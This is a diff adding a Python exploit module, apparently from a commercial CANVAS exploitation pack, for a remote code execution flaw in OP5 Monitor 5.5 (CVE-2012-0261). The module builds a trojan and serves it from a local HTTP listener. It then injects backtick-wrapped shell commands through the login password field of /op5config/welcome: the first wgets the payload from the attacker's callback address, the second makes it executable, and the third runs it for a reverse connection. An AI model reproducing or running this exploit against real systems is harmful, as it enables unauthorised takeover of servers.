@@ -1,0 +1,255 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2012
+#
+
+import sys
+import time
+import os
+import random
+import thread
+import urllib
+
+from urllib import urlopen
+from sgmllib import SGMLParser
+
+sys.path.append(".")
+sys.path.append("../../")
+
+import canvasengine
+import libs.spkproxy as spkproxy
+from libs.spkproxy import header, body
+from libs.canvasos import *
+from exploitutils import *
+from tcpexploit import tcpexploit
+
+
+# GUI info
+NAME = "OP5 Monitor Remote Code Execution Vulnerability"
+
+DESCRIPTION = "Remote Code Execution in OP5 Monitor"
+
+DOCUMENTATION = {}
+DOCUMENTATION["VENDOR"] = "OP5"
+DOCUMENTATION["Repeatability"] = "Infinite"
+DOCUMENTATION["Versions Affected"] = "OP5 Monitor 5.5"
+DOCUMENTATION["Date public"] = "2012.01.02"
+DOCUMENTATION["References"] = "http://www.ekelow.se/file_uploads/Advisories/ekelow-aid-2012-01.pdf"
+DOCUMENTATION["CERT Advisory"] = ""
+DOCUMENTATION["CVE Name"] = "CVE-2012-0261"
+DOCUMENTATION["CVE Url"] = "http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0261"
+DOCUMENTATION["Notes"] = ""
+
+VERSION = '1.0'
+
+GTK2_DIALOG = 'dialog.glade2'
+
+PROPERTY = {}
+PROPERTY['TYPE'] = "Web Exploits"
+PROPERTY['SITE'] = "Remote"
+PROPERTY['ARCH'] = [ ["Linux"] ]
+
+NOTES="""
+"""
+
+CHANGELOG="""
+"""
+
+
+class theexploit(tcpexploit):
+	def __init__(self):
+		tcpexploit.__init__(self)
+		self.setInfo(DESCRIPTION)
+		self.name = NAME       
+		self.trojanname = "d2"
+		return
+ 
+	def maketrojan(self):    	
+		t_os = canvasos("Linux")
+		t_os.arch = "X86"
+	    
+		self.buildmosdeftrojan(self.callback.ip, self.callback.port, target_os = t_os)        
+		self.log("Writing out %d bytes to %s"%(len(self.mosdeftrojan), self.trojanname))        		
+		file(self.trojanname, "wb").write(self.mosdeftrojan)
+		self.setInfo("%s - done"%(NAME))
+		ret = len(self.mosdeftrojan) != 0	
+
+		return ret		    
+
+	def makesploit(self, clientheader, clientbody):        
+		from libs.spkproxy import header, body
+		h = header('SERVER')
+		b = body()				
+		        
+		if clientheader.URL.count(self.trojanname):
+			self.log("Sending MOSDEF trojan")
+			f = open(self.trojanname, "rb")
+			sploitstring = f.read()
+			f.close()
+			os.remove(self.trojanname)
+			self.log("Sending %d bytes"%len(sploitstring))
+			h.addHeader("Content-type","binary/octet-stream")
+			h.addHeader("Connection","close")
+			b.setBody(sploitstring)
+		
+		return h, b
+
+	def neededListenerTypes(self):
+		from canvasengine import LINUXMOSDEF
+		return [LINUXMOSDEF]
+
+	#################################################################################################################
+	# Code from httpserver.py
+	def listen(self):
+		self.getargs()
+		s=self.gettcplistener(80, "0.0.0.0")
+		
+		if not s:
+			self.log("Cannot listen on port 80 - perhaps that port is already bound?")
+			return 0
+		s.set_timeout(5)
+		self.s=s
+		return s 
+	
+	def accept(self, s=None ):
+		"""
+		Try to accept one connection
+		returns true if we found one
+		"""
+		#we loop on this ,so no annoying printouts here
+		#self.log("Accepting connection")
+		if s==None:
+			s=self.s 
+		try:
+			infd,addr=s.accept()
+		except timeoutsocket.Timeout:
+			#self.log("Timed out - no accept yet")
+			return 
+		if infd==-1:
+			return
+		
+		#else we have an infd
+		self.handle(infd)
+		return True #handled connection
+	    
+	def handle(self, infd): 
+		self.log("Handling connection")
+		clientheader = header(state = "SERVER")
+		clientheader.ssl = self.ssl
+		ret = clientheader.readdata(infd)
+		clientbody = body()
+		
+		if clientheader.gotGoodHeader():
+			if clientheader.bodySize()>0 or clientheader.wasChunked:
+				self.log("Reading body")
+				clientbody.read(infd, clientheader.bodySize(), clientheader.wasChunked, 0)
+				self.log("Read body")
+		
+		self.log("Creating exploit response")		
+		servheader,servbody = self.makesploit(clientheader,clientbody)
+				
+		self.log("Responding")		
+		bodydata = "".join(servbody.data)		            		
+		response = ""
+		response += "%s %s %s\r\n"%(servheader.version, servheader.status, servheader.msg)		
+		self.log(response)
+		
+		for akey in servheader.headerValuesDict.keys():
+			if akey not in [ "Content-Length", "Content-length"]:
+				response += servheader.grabHeader(akey)
+				
+		self.log("Sending header data of %d bytes"%len(response))
+		chunked = 0
+		
+		if not chunked:
+			response += "Content-Length: "+str(len(bodydata))+"\r\n"
+			
+		response += "\r\n"
+		response += "".join(bodydata)
+		self.log("Total response length is %d bytes"%len(response))
+		
+		try:
+			infd.sendall(response)
+		except socket.error:
+			self.log("Connection closed by peer")
+			
+		self.log("Response sent")
+		infd.close() #connection close - later on we'll keep it.
+		return 
+	#
+	#################################################################################################################
+        
+	def startHTTPServer(self):
+		s = self.listen()
+		
+		if not s:
+			self.log("Failed to listen - not running")
+			return 0
+			
+		while 1:
+			if self.state==self.HALT:
+				self.s.close()
+				break
+			self.accept()
+		
+		self.setInfo("%s on %s:%d - done (success!)"%(NAME, self.bindip, self.port))		
+		return 1
+
+	def getargs(self):	
+		self.host = self.target.interface
+    	        
+	def run(self):
+		self.getargs()
+		self.maketrojan()
+				
+		thread.start_new_thread(self.startHTTPServer,())
+		
+		ua = spkproxy.UserAgent("", exploit=self)
+        
+		self.cmd = "wget -O /tmp/" + self.trojanname + " http://" + self.callback.ip + "/" + self.trojanname
+		params = urllib.urlencode({'do':'Login', 'password':'`%s`'%self.cmd})
+		url = "/op5config/welcome"    
+		mainurl = "https://%s%s" % (self.host, url)		
+		self.log(mainurl)
+		self.log(params)		
+		data = ua.POST(mainurl, params)    
+
+		time.sleep(3)
+		
+		self.cmd = "chmod 777 /tmp/" + self.trojanname
+		params = urllib.urlencode({'do':'Login', 'password':'`%s`'%self.cmd})
+		url = "/op5config/welcome"    
+		mainurl = "https://%s%s" % (self.host, url)			
+		self.log(mainurl)
+		self.log(params)		
+		data = ua.POST(mainurl, params)    
+
+		time.sleep(3)
+		
+		self.cmd = "/tmp/" + self.trojanname
+		params = urllib.urlencode({'do':'Login', 'password':'`%s`'%self.cmd})
+		url = "/op5config/welcome"    
+		mainurl = "https://%s%s" % (self.host, url)			
+		self.log(mainurl)
+		self.log(params)		
+		data = ua.POST(mainurl, params)    	
+ 				
+		while 1:
+			time.sleep(1)			
+		          
+		self.setInfo('[D2] %s attacking %s - done' % (NAME, self.host))
+						            
+		return 1                   
+			  		
+	def usage(self):        
+		print "Usage: %s -v version -t targethost -l localip -d localport\n" % sys.argv[0]				
+		sys.exit(0) 
+
+if __name__ == '__main__':
+	print "Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION)
+	app = theexploit()
+	ret = standard_callback_commandline(app)
